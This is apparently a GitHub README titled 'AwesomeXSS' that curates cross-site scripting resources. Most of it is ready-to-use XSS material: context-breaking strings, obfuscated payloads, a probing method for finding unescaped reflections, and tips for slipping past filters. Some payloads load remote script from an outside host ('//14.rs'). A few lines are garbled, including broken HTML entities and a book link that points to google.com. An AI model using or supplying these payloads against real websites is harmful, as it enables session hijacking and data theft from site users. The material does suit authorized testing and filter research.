# AwesomeXSS
Awesome XSS stuff.
Put this repo on watch. I will be updating it regularly.

### Awesome Books
- [XSS Cheat Sheet By Brute Logic](http://google.com)

### Awesome Websites
- [brutelogic.com.br](http://brutelogic.com.br)
- [respectxss.blogspot.in](https://respectxss.blogspot.in/)

### Awesome People
- [Rodolfo Assis](https://twitter.com/brutelogic)
- [Ashar Javed](https://twitter.com/soaj1664ashar)
- [Somdev Sangwan](https://twitter.com/s0md3v) because I made this repo :3

### Awesome Reads
- [XSS in Sarahah](http://www.shawarkhan.com/2017/08/sarahah-xss-exploitation-tool.html)
- [XSS in Facebook via PNG Content Type](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)

### Awesome Presentations
- [How I met your girlfriend](https://www.youtube.com/watch?v=fWk_rMQiDGc)
- [How to Find 1,352 Wordpress XSS Plugin Vulnerabilities in one hour](https://www.youtube.com/watch?v=9ADubsByGos)
- [Blind XSS](https://www.youtube.com/watch?v=OT0fJEtz7aE)
- [Copy Pest](https://www.slideshare.net/x00mario/copypest)

### Awesome Tools
- [XSStrike](http://xsstrike.tk/)
- [KNOXSS](http://knoxss.me/)

### Awesome Context Breaking

#### Simple Context
```
<svg onload=alert()>
</tag><svg onload=alert()>
```

#### Attribute Context
```
"><svg onload=alert()>
"><svg onload=alert()><b attr="
" onmouseover=alert() "
"onmouseover=alert()//
```
#### JavaScript Context
```
'-alert()-'
'-alert()//'
'}alert(1);{'
'}%0Aalert(1);%0A{'
</script><svg onload=alert()>
```

### Awesome Payloads
```
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg/x=">"/onload=confirm()//
<embed src=//14.rs>
<x oncut=alert()>x
<details ontoggle=confirm()>
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
```

### Awesome Exploits
Come back later

### Awesome Tags & Event Handlers
- [List of all Event Handlers](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)

#### HTML Tags that you will be using
```
img
svg
body
html
embed
script
object
details
isindex
iframe
audio
video
```

### Awesome Probing
If nothing of this works, take a look at **Awesome Bypassing** section

First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of refelections.
<br>Now for attribute context, check if double quotes (") are being filtered by entering **x"d3v**. If it gets altered to **x&quot;d3v**, chances are that proper security measures are in place. If this happens, try doing the same for single quotes (') by entering **x'd3v**, if it gets altered to **x&apos;**, you are doomed. The only thing you can try is encoding.<br>
If the quotes are not being filtered, you can simply try payloads from **Awesome Context Breaking** section.
<br>For javascript context, check which quotes are being used for example if they are doing
```
variable = 'value' or variable = "value"
```
Now lets say single quotes (') are in use, in that case enter **x'd3v**. If it gets altered to **x\'d3v**, try escaping the backslash (\) by adding a backslash to your probe i.e. **x\'d3v**. If it works use the following payload:
```
\'-alert()-\'
```
But if it gets altered to **x\\'d3v**, the only thing you can try is closing the script tag itself by using
```
</script><svg onload=alert()>
```
For simple HTML context, the probe is **x&gt;d3v**. If it gets altered to **x&gt;d3v**, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potenial filters. The dummy tag I like to use is **x&lt;xxx&gt;**. If it gets stripped or altered in any way, it means the filter is looking for a pair of **<** and **>**. It can simply bypassed using
```
<svg onload=alert()//
```
or this (it will not work in all cases)
```
<svg onload=alert()
```
If the your dummy tags lands in the source code as it is, go for any of these payloads
```
<svg onload=alert()>
<embed src=//14.rs>
<details open ontoggle=alert()>
```

### Awesome Bypassing
Come back later

### Awesome Tips & Tricks
- http(s):// can be shortened to // or /\.
- **document.cookie** can be shortened to **cookie**. It applies to other DOM objects as well.
- alert and other pop-up functions don't need a value, so stop doing **alert(1)** and start doing **alert()**
- I have found that **confirm** is the least detected pop-up function so stop using **alert**.
- Quotes around attribute value aren't neccessary. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&glt;**
- The shortest independent payload is **&lt;embed src=//14.rs&gt;** (19 chars)

### Awesome Credits
All the payloads are crafted by me unless specified.
Thanks to my big brother [Rodolfo Assis](https://twitter.com/brutelogic) whose writings inspired me to become an XSSLord.
